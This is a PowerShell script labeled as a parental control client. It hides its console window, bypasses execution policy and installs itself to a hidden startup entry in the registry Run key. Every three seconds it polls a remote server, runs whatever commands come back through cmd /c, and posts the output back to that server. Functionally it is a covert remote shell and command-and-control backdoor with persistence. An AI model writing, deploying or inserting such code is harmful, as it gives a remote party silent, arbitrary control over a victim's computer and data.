# FIXED VERSION - Uses _id (with underscore)
$SERVER = "https://parental-web.vercel.app"
$COMPUTER_ID = $env:COMPUTERNAME

# Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Hide window
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
}
'@
$hwnd = [Window]::GetConsoleWindow()
[Window]::ShowWindow($hwnd, 0) | Out-Null

Write-Host "✅ Parental Control Client Started" -ForegroundColor Green
Write-Host "Computer: $COMPUTER_ID" -ForegroundColor Cyan
Write-Host "Server: $SERVER" -ForegroundColor Cyan

# Save to startup
$startupScript = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

`$SERVER = '$SERVER'
`$COMPUTER_ID = `$env:COMPUTERNAME

while(`$true){
    try{
        # Get commands - IMPORTANT: Uses _id not id
        `$response = Invoke-RestMethod "`$SERVER/api/child/`$COMPUTER_ID" -TimeoutSec 10
        
        if(`$response.child -and `$response.commands){
            foreach(`$cmd in `$response.commands){
                # Execute command
                `$output = cmd /c `$cmd.command 2>&1 | Out-String
                
                # Send result back - Uses _id (with underscore)
                `$body = @{result=`$output} | ConvertTo-Json
                `$url = "`$SERVER/api/command/result/`$(`$response.child._id)/`$(`$cmd._id)"
                Invoke-RestMethod `$url -Method POST -Body `$body -ContentType 'application/json' -TimeoutSec 5
            }
        }
    }catch{
        # Silent error
    }
    Start-Sleep 3
}
"@

# Save script
$scriptPath = "$env:APPDATA\parent-control.ps1"
$startupScript | Out-File $scriptPath -Encoding UTF8

# Add to startup
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
New-ItemProperty -Path $regPath -Name "ParentControl" -Value $regValue -Force | Out-Null

Write-Host "✓ Installed to startup" -ForegroundColor Green

# Main loop
while($true){
    try{
        # Get commands
        $response = Invoke-RestMethod "$SERVER/api/child/$COMPUTER_ID" -TimeoutSec 10
        
        if ($response.child -and $response.commands) {
            foreach($cmd in $response.commands){
                # Execute command
                $output = cmd /c $cmd.command 2>&1 | Out-String
                
                # Send result back - USES _id (with underscore)
                $body = @{result=$output} | ConvertTo-Json
                $url = "$SERVER/api/command/result/$($response.child._id)/$($cmd._id)"
                Invoke-RestMethod $url -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5 | Out-Null
                
                Write-Host "✓ Command executed: $($cmd.command)" -ForegroundColor Green
            }
        }
    }catch{
        Write-Host "✗ Error: $_" -ForegroundColor Red
    }
    Start-Sleep 3
}